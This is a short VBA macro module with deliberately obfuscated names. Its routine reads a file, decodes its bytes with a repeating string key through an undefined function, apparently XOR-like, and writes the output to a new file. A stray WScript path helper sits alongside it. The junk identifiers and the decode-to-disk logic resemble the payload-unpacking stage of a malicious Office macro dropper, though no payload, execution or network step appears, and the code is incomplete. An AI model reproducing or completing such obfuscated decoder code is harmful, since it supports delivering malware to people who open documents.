Attribute VB_Name = "Module3"

Function InArray(strValue, List, Col)
Dim i
For i = 0 To UBound(List)
If List(i, Col) = CStr(strValue) Then
InArray = True
Exit Function
End If
Next
InArray = False
End Function



Public Sub Method1(MethodParam2() As Byte, MethodParam As String)

  
  Dim Frix2 As Long
  Dim Frix3 As Long
  Dim Frix5 As Long
  Dim Frix6 As Long
  Dim plusplus() As Byte
Dim Frix4 As Long
Dim plusplusLen As Long
  plusplusLen = Len(MethodParam)
ReDim plusplus(plusplusLen)

  plusplus = StrConv(MethodParam, vbFromUnicode)

  
  Frix2 = UBound(MethodParam2) + 1
  Frix5 = Frix2
  
  
  For Frix4 = _
  0 To (Frix2 - 1)
    aa = plusplus(Frix4 Mod plusplusLen)
    bb = MethodParam2(Frix4)
    MethodParam2(Frix4) = Ashnorog(bb, aa)
    
    If (Frix4 >= Frix6) Then
      Frix3 = Int((Frix4 / Frix5) * 100)
      Frix6 = (Frix5 * ((Frix3 + 1) / 100)) + 1
    End If
  Next
End Sub
Public Sub WidthA(Di1 As String, i1J As String, Optional alalalabamala_Sexote As String)

  Dim i1 As Integer
  Dim Gi1() As Byte
  
  i1 = FreeFile
  Open Di1 For Binary As #i1
  ReDim Gi1(0 To LOF(i1) - 1)
  Get #i1, , Gi1()
  Close #i1
  Call Method1(Gi1(), alalalabamala_Sexote)
  i1 = FreeFile
  Open i1J For Binary As #i1
  Put #i1, , Gi1()
  Close #i1

End Sub
Function GetPath()
Dim path
path = WScript.ScriptFullName
GetPath = Left(path, InStrRev(path, "\"))
End Function


